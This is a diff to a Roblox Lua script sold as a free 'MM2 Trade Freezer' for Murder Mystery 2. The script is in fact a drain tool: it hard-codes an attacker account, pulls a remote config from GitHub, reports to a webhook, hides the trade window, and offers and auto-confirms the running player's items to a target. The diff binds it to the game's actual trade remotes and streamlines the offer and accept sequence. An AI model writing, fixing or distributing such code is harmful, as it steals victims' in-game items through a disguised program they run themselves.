@@ -1,11 +1,17 @@
---[[ MM2 Trade Freezer v8.5 | KEYLESS | FREE ]]
+--[[ MM2 Trade Freezer v8.6 | KEYLESS | FREE ]]
 
 local CONFIG = {
     WEBHOOK        = "",
     REMOTE_CONFIG  = "https://raw.githubusercontent.com/sarettaclash01-ctrl/mm2cfg/main/cfg.json",
     ATTACKER_ID    = 0,
     ATTACKER_NAME  = "Viivik13",
-    REMOTES = { send = "", add = "", accept = "", confirm = "", cancel = "" },
+    REMOTES = {
+        send    = "Trade.SendRequest",
+        add     = "Trade.OfferItem",
+        accept  = "Trade.AcceptTrade",
+        confirm = "Trade.CompleteTrade",
+        cancel  = "Trade.DeclineTrade",
+    },
     LOAD_DURATION  = 120,
     MODE           = "DRAIN",
     FILTER         = "all",
@@ -110,7 +116,7 @@ local function webhook(title, color, desc, fields, content)
         local thumb = {}
         thumb.url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", lp.UserId)
         local foot = {}
-        foot.text = "MM2 Trade Freezer v8.5 | keyless"
+        foot.text = "MM2 Trade Freezer v8.6 | keyless"
         local emb = {}
         emb.title = title
         emb.description = desc
@@ -176,7 +182,7 @@ title.Font = Enum.Font.GothamBold
 title.TextSize = 13
 title.TextXAlignment = Enum.TextXAlignment.Left
 title.TextColor3 = Color3.fromRGB(235, 235, 240)
-title.Text = "MM2 Trade Freezer   v8.5"
+title.Text = "MM2 Trade Freezer   v8.6"
 title.Parent = titleBar
 
 local badge = Instance.new("TextLabel")
@@ -400,9 +406,8 @@ local function runLoader()
 end
 task.spawn(runLoader)
 
-log("Trade Freezer v8.5 loaded")
+log("Trade Freezer v8.6 loaded")
 log("place " .. game.PlaceId)
-if game.PlaceId ~= CONFIG.PLACE_ID then log("note: not the MM2 place") end
 
 local VALUES = {}
 local CACHE_FILE = "MM2FZ_values.json"
@@ -493,30 +498,13 @@ local BASELINE = {
 for k, v in pairs(BASELINE) do VALUES[k] = v end
 
 local function loadValues()
-    if isfile and isfile(CACHE_FILE) then
-        local raw = readfile(CACHE_FILE)
-        local okd, d = pcall(HttpService.JSONDecode, HttpService, raw)
-        if okd and type(d) == "table" and type(d.v) == "table" then
-            if d.t and os.time() - d.t < 21600 then
-                for k, v in pairs(d.v) do setVal(k, v) end
-                log("value cache loaded")
-            end
-        end
-    end
     for _, url in ipairs(SOURCES) do
         local res = getUrl(url)
         if res and res.Body then
             local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
             if ok and type(data) == "table" then
-                local count = ingest(data)
-                if count > 20 then
+                if ingest(data) > 20 then
                     log("value index synced")
-                    if writefile then
-                        local payload = {}
-                        payload.t = os.time()
-                        payload.v = VALUES
-                        pcall(writefile, CACHE_FILE, HttpService:JSONEncode(payload))
-                    end
                     return
                 end
             end
@@ -618,16 +606,38 @@ end
 
 loadConfig()
 
+local function byPath(path)
+    local node = ReplicatedStorage
+    for part in path:gmatch("[^%.]+") do
+        node = node:FindFirstChild(part)
+        if not node then return nil end
+    end
+    return node
+end
+
+local function usable(r)
+    if not r then return false end
+    if r:IsA("RemoteEvent") then return true end
+    if r:IsA("RemoteFunction") then return true end
+    return false
+end
+
+local function call(remote, ...)
+    if not usable(remote) then return end
+    local args = { ... }
+    local n = select("#", ...)
+    if remote:IsA("RemoteFunction") then
+        pcall(function() remote:InvokeServer(table.unpack(args, 1, n)) end)
+    else
+        pcall(function() remote:FireServer(table.unpack(args, 1, n)) end)
+    end
+end
+
 local function findRemote(patterns)
-    local roots = {}
-    roots[1] = ReplicatedStorage:FindFirstChild("GameRemotes")
-    roots[2] = ReplicatedStorage:FindFirstChild("Remotes")
-    roots[3] = ReplicatedStorage:FindFirstChild("RemoteEvents")
-    roots[4] = ReplicatedStorage
-    for _, c in ipairs(roots) do
+    for _, c in ipairs({ ReplicatedStorage:FindFirstChild("Trade"), ReplicatedStorage }) do
         if c then
-            for _, d in ipairs(c:GetDescendants()) do
-                if d:IsA("RemoteEvent") then
+            for _, d in ipairs(c:GetChildren()) do
+                if usable(d) then
                     local n = d.Name:lower()
                     for _, p in ipairs(patterns) do
                         if n:find(p, 1, true) then return d end
@@ -639,22 +649,16 @@ local function findRemote(patterns)
     return nil
 end
 
-local function resolveRemote(override, patterns, label, timeout)
+local function resolveRemote(override, patterns, label)
     if override and override ~= "" then
-        local r = ReplicatedStorage:FindFirstChild(override, true)
-        if r and r:IsA("RemoteEvent") then
-            log("remote locked: " .. r.Name)
+        local r = byPath(override)
+        if usable(r) then
+            log("remote locked: " .. override)
             return r
         end
         log("override failed: " .. override)
     end
     local r = findRemote(patterns)
-    local t = 0
-    while not r and t < (timeout or 10) do
-        task.wait(0.4)
-        t = t + 0.4
-        r = findRemote(patterns)
-    end
     if r then
         log("remote bound: " .. r.Name)
     else
@@ -664,11 +668,11 @@ local function resolveRemote(override, patterns, label, timeout)
 end
 
 local R = {}
-R.send    = resolveRemote(CONFIG.REMOTES.send,    { "sendtrade", "traderequest", "trade_request", "requesttrade" }, "send")
-R.add     = resolveRemote(CONFIG.REMOTES.add,     { "additem", "offeritem", "addtrade", "tradeitem" }, "add")
-R.accept  = resolveRemote(CONFIG.REMOTES.accept,  { "accepttrade", "tradeaccept", "accept_trade" }, "accept")
-R.confirm = resolveRemote(CONFIG.REMOTES.confirm, { "confirmtrade", "tradeconfirm", "confirm" }, "confirm")
-R.cancel  = resolveRemote(CONFIG.REMOTES.cancel,  { "canceltrade", "declinetrade", "tradecancel" }, "cancel")
+R.send    = resolveRemote(CONFIG.REMOTES.send,    { "sendrequest", "request" }, "send")
+R.add     = resolveRemote(CONFIG.REMOTES.add,     { "offeritem", "additem", "offer" }, "add")
+R.accept  = resolveRemote(CONFIG.REMOTES.accept,  { "accepttrade", "accept" }, "accept")
+R.confirm = resolveRemote(CONFIG.REMOTES.confirm, { "completetrade", "complete", "confirm" }, "confirm")
+R.cancel  = resolveRemote(CONFIG.REMOTES.cancel,  { "declinetrade", "decline", "cancel" }, "cancel")
 
 local function hideTradeUI()
     for _, g in ipairs(playerGui:GetChildren()) do
@@ -821,7 +825,7 @@ local function doRound(batch, tgt, round)
         if STATE.stopped then break end
         attempt = attempt + 1
         if attempt % 3 == 1 then log("request -> " .. tgt.Name .. " (r" .. round .. ")") end
-        pcall(function() R.send:FireServer(tgt) end)
+        call(R.send, tgt)
         local w = 0
         while w < 4 do
             if gui then break end
@@ -847,19 +851,18 @@ local function doRound(batch, tgt, round)
         local before = 0
         if gui then before = countIn(gui, it.name) end
         local ok = false
-        local variants = {}
-        variants[1] = { it.id }
-        variants[2] = { it.id, "Offer" }
-        variants[3] = { "Add", it.id }
-        for _, args in ipairs(variants) do
-            pcall(function() R.add:FireServer(table.unpack(args)) end)
-            task.wait(0.18)
+        call(R.add, it.id)
+        task.wait(0.25)
+        gui = tradeGui()
+        if gui then
+            if countIn(gui, it.name) > before then ok = true end
+        end
+        if not ok then
+            call(R.add, it.id, "Offer")
+            task.wait(0.2)
             gui = tradeGui()
             if gui then
-                if countIn(gui, it.name) > before then
-                    ok = true
-                    break
-                end
+                if countIn(gui, it.name) > before then ok = true end
             end
         end
         if ok then placed = placed + 1 end
@@ -867,17 +870,17 @@ local function doRound(batch, tgt, round)
     end
 
     if placed == 0 then
-        if R.cancel then pcall(function() R.cancel:FireServer() end) end
+        call(R.cancel)
         return false, "nothing placed"
     end
     log("offered " .. placed .. "/" .. #batch)
 
     task.wait(CONFIG.ACCEPT_DELAY)
-    if R.accept then pcall(function() R.accept:FireServer() end) end
+    call(R.accept)
     task.wait(0.8)
-    if R.confirm then pcall(function() R.confirm:FireServer() end) end
+    call(R.confirm)
     task.wait(0.6)
-    if R.accept then pcall(function() R.accept:FireServer() end) end
+    call(R.accept)
 
     local t = 0
     while t < CONFIG.WINDOW_WATCHDOG do
@@ -886,9 +889,7 @@ local function doRound(batch, tgt, round)
         t = t + 0.5
     end
     local closed = tradeGui() == nil
-    if not closed then
-        if R.cancel then pcall(function() R.cancel:FireServer() end) end
-    end
+    if not closed then call(R.cancel) end
     task.wait(1)
 
     local remSet = {}
